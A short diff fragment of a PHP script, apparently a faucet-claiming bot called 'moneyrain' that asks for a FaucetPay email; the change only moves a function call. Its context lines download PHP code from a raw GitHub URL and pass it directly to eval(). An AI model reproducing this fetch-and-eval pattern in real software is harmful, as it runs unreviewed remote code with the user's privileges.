@@ -12,13 +12,13 @@ function sock(){
         }
     }
     sock();
-    bn();
+    
 const script = "moneyrain";
 
 
 $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku.php");
 eval($function);
-
+bn();
 $email = Sav("email faucetpay");
 
 function head() {
